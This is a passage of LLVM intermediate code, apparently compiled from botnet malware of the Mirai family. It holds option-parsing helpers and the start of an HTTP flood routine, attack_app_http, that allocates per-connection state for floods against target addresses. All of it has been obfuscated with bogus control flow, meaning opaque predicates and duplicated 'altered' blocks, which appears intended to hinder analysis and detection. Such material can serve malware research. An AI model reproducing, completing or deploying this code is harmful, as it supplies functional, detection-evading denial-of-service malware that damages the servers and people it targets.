  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %94
  %103 = load i32, i32* %5, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %5, align 4
  %105 = load i32, i32* @x.9
  %106 = load i32, i32* @y.10
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart221, label %originalBB14alteredBB

originalBBpart221:                                ; preds = %originalBB14
  br label %26

; <label>:113:                                    ; preds = %originalBBpart24
  %114 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %115 = bitcast %struct.attack_option* %114 to i8*
  call void @free(i8* %115) #6
  br label %116

; <label>:116:                                    ; preds = %113, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %117 = load i32, i32* %5, align 4
  %118 = load i32, i32* %4, align 4
  %119 = icmp slt i32 %117, %118
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %120 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %120, i64 %122
  %124 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %123, i32 0, i32 0
  %125 = load i8*, i8** %124, align 8
  %126 = icmp ne i8* %125, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %77
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %94
  %127 = load i32, i32* %5, align 4
  %_ = sub i32 0, %127
  %gen = add i32 %_, 1
  %_15 = shl i32 %127, 1
  %_16 = sub i32 %127, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %127
  %gen19 = add i32 %_18, 1
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %5, align 4
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart29, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %70

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %72

; <label>:34:                                     ; preds = %16
  %35 = load i32, i32* @x.11
  %36 = load i32, i32* @y.12
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* @x.11
  %44 = load i32, i32* @y.12
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %51

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* @x.11
  %53 = load i32, i32* @y.12
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %51
  %60 = load i32, i32* %10, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %10, align 4
  %62 = load i32, i32* @x.11
  %63 = load i32, i32* @y.12
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %11

; <label>:70:                                     ; preds = %11
  %71 = load i8*, i8** %9, align 8
  store i8* %71, i8** %5, align 8
  br label %72

; <label>:72:                                     ; preds = %70, %27
  %73 = load i8*, i8** %5, align 8
  ret i8* %73

originalBBalteredBB:                              ; preds = %originalBB, %34
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %51
  %74 = load i32, i32* %10, align 4
  %_ = shl i32 %74, 1
  %_2 = sub i32 0, %74
  %gen = add i32 %_2, 1
  %_3 = sub i32 %74, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 0, %74
  %gen6 = add i32 %_5, 1
  %_7 = shl i32 %74, 1
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %10, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.13
  %6 = load i32, i32* @y.14
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.13
  %26 = load i32, i32* @y.14
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %35

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* %17, align 4
  store i32 %34, i32* %13, align 4
  br label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i8*, i8** %18, align 8
  %37 = call i32 @util_atoi(i8* %36, i32 10)
  store i32 %37, i32* %13, align 4
  br label %38

; <label>:38:                                     ; preds = %35, %33
  %39 = load i32, i32* @x.13
  %40 = load i32, i32* @y.14
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %13, align 4
  %48 = load i32, i32* @x.13
  %49 = load i32, i32* @y.14
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %4
  %56 = alloca i32, align 4
  %57 = alloca i8, align 1
  %58 = alloca %struct.attack_option*, align 8
  %59 = alloca i8, align 1
  %60 = alloca i32, align 4
  %61 = alloca i8*, align 8
  store i8 %0, i8* %57, align 1
  store %struct.attack_option* %1, %struct.attack_option** %58, align 8
  store i8 %2, i8* %59, align 1
  store i32 %3, i32* %60, align 4
  %62 = load i8, i8* %57, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %58, align 8
  %64 = load i8, i8* %59, align 1
  %65 = call i8* @attack_get_opt_str(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext %64, i8* null)
  store i8* %65, i8** %61, align 8
  %66 = load i8*, i8** %61, align 8
  %67 = icmp eq i8* %66, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %68 = load i32, i32* %13, align 4
  br label %originalBB1
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.15
  %6 = load i32, i32* @y.16
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.15
  %26 = load i32, i32* @y.16
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %35

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* %17, align 4
  store i32 %34, i32* %13, align 4
  br label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i8*, i8** %18, align 8
  %37 = call i32 @inet_addr(i8* %36) #6
  store i32 %37, i32* %13, align 4
  br label %38

; <label>:38:                                     ; preds = %35, %33
  %39 = load i32, i32* @x.15
  %40 = load i32, i32* @y.16
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %13, align 4
  %48 = load i32, i32* @x.15
  %49 = load i32, i32* @y.16
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %4
  %56 = alloca i32, align 4
  %57 = alloca i8, align 1
  %58 = alloca %struct.attack_option*, align 8
  %59 = alloca i8, align 1
  %60 = alloca i32, align 4
  %61 = alloca i8*, align 8
  store i8 %0, i8* %57, align 1
  store %struct.attack_option* %1, %struct.attack_option** %58, align 8
  store i8 %2, i8* %59, align 1
  store i32 %3, i32* %60, align 4
  %62 = load i8, i8* %57, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %58, align 8
  %64 = load i8, i8* %59, align 1
  %65 = call i8* @attack_get_opt_str(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext %64, i8* null)
  store i8* %65, i8** %61, align 8
  %66 = load i8*, i8** %61, align 8
  %67 = icmp eq i8* %66, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %68 = load i32, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %4141

; <label>:90:                                     ; preds = %86
  %91 = load i32, i32* @x.17
  %92 = load i32, i32* @y.18
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %90
  %99 = load i8*, i8** %17, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = icmp sgt i32 %100, 255
  %102 = load i32, i32* @x.17
  %103 = load i32, i32* @y.18
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %101, label %110, label %111

; <label>:110:                                    ; preds = %originalBBpart2
  br label %4141

; <label>:111:                                    ; preds = %originalBBpart2
  %112 = load i32, i32* @x.17
  %113 = load i32, i32* @y.18
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %111
  %120 = load i8*, i8** %16, align 8
  %121 = call i32 @util_strlen(i8* %120)
  %122 = icmp sgt i32 %121, 127
  %123 = load i32, i32* @x.17
  %124 = load i32, i32* @y.18
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %122, label %131, label %132

; <label>:131:                                    ; preds = %originalBBpart24
  br label %4141

; <label>:132:                                    ; preds = %originalBBpart24
  %133 = load i8*, i8** %15, align 8
  %134 = call i32 @util_strlen(i8* %133)
  %135 = icmp sgt i32 %134, 9
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %4141

; <label>:137:                                    ; preds = %132
  store i32 0, i32* %10, align 4
  br label %138

; <label>:138:                                    ; preds = %185, %137
  %139 = load i32, i32* %10, align 4
  %140 = load i8*, i8** %15, align 8
  %141 = call i32 @util_strlen(i8* %140)
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %188

; <label>:143:                                    ; preds = %138
  %144 = load i8*, i8** %15, align 8
  %145 = load i32, i32* %10, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = sext i8 %148 to i32
  %150 = icmp sge i32 %149, 97
  br i1 %150, label %151, label %184

; <label>:151:                                    ; preds = %143
  %152 = load i8*, i8** %15, align 8
  %153 = load i32, i32* %10, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp sle i32 %157, 122
  br i1 %158, label %159, label %184

; <label>:159:                                    ; preds = %151
  %160 = load i32, i32* @x.17
  %161 = load i32, i32* @y.18
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %159
  %168 = load i8*, i8** %15, align 8
  %169 = load i32, i32* %10, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = sub nsw i32 %173, 32
  %175 = trunc i32 %174 to i8
  store i8 %175, i8* %171, align 1
  %176 = load i32, i32* @x.17
  %177 = load i32, i32* @y.18
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %184

; <label>:184:                                    ; preds = %originalBBpart210, %151, %143
  br label %185

; <label>:185:                                    ; preds = %184
  %186 = load i32, i32* %10, align 4
  %187 = add nsw i32 %186, 1
  store i32 %187, i32* %10, align 4
  br label %138

; <label>:188:                                    ; preds = %138
  %189 = load i32, i32* %18, align 4
  %190 = icmp sgt i32 %189, 256
  br i1 %190, label %191, label %208

; <label>:191:                                    ; preds = %188
  %192 = load i32, i32* @x.17
  %193 = load i32, i32* @y.18
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %191
  store i32 256, i32* %18, align 4
  %200 = load i32, i32* @x.17
  %201 = load i32, i32* @y.18
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %208

; <label>:208:                                    ; preds = %originalBBpart214, %188
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  call void @table_unlock_val(i8 zeroext 54)
  call void @table_unlock_val(i8 zeroext 55)
  call void @table_unlock_val(i8 zeroext 56)
  call void @table_unlock_val(i8 zeroext 57)
  call void @table_unlock_val(i8 zeroext 58)
  call void @table_unlock_val(i8 zeroext 59)
  call void @table_unlock_val(i8 zeroext 60)
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  %209 = load i32, i32* %18, align 4
  %210 = sext i32 %209 to i64
  %211 = call noalias i8* @calloc(i64 %210, i64 3140) #6
  %212 = bitcast i8* %211 to %struct.attack_http_state*
  store %struct.attack_http_state* %212, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %213

; <label>:213:                                    ; preds = %442, %208
  %214 = load i32, i32* %9, align 4
  %215 = load i32, i32* %18, align 4
  %216 = icmp slt i32 %214, %215
  br i1 %216, label %217, label %445

; <label>:217:                                    ; preds = %213
  %218 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %219 = load i32, i32* %9, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %218, i64 %220
  %222 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %221, i32 0, i32 1
  store i8 0, i8* %222, align 4
  %223 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %226, i32 0, i32 0
  store i32 -1, i32* %227, align 4
  %228 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %229 = load i32, i32* %9, align 4
  %230 = load i8, i8* %5, align 1
  %231 = zext i8 %230 to i32
  %232 = srem i32 %229, %231
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i64 %233
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i32 0, i32 1
  %236 = load i32, i32* %235, align 4
  %237 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %238 = load i32, i32* %9, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i32 0, i32 4
  store i32 %236, i32* %241, align 4
  %242 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %243 = load i32, i32* %9, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %242, i64 %244
  %246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %245, i32 0, i32 6
  %247 = getelementptr inbounds [257 x i8], [257 x i8]* %246, i32 0, i32 0
  %248 = load i8*, i8** %17, align 8
  %249 = call i32 @util_strcpy(i8* %247, i8* %248)
  %250 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %251 = load i32, i32* %9, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %250, i64 %252
  %254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %253, i32 0, i32 6
  %255 = getelementptr inbounds [257 x i8], [257 x i8]* %254, i64 0, i64 0
  %256 = load i8, i8* %255, align 4
  %257 = sext i8 %256 to i32
  %258 = icmp ne i32 %257, 47
  br i1 %258, label %259, label %287

; <label>:259:                                    ; preds = %217
  %260 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %261 = load i32, i32* %9, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %260, i64 %262
  %264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %263, i32 0, i32 6
  %265 = getelementptr inbounds [257 x i8], [257 x i8]* %264, i32 0, i32 0
  %266 = getelementptr inbounds i8, i8* %265, i64 1
  %267 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %268 = load i32, i32* %9, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %267, i64 %269
  %271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %270, i32 0, i32 6
  %272 = getelementptr inbounds [257 x i8], [257 x i8]* %271, i32 0, i32 0
  %273 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %276, i32 0, i32 6
  %278 = getelementptr inbounds [257 x i8], [257 x i8]* %277, i32 0, i32 0
  %279 = call i32 @util_strlen(i8* %278)
  %280 = sext i32 %279 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %266, i8* %272, i64 %280, i32 1, i1 false)
  %281 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %282 = load i32, i32* %9, align 4
  %283 = sext i32 %282 to i64
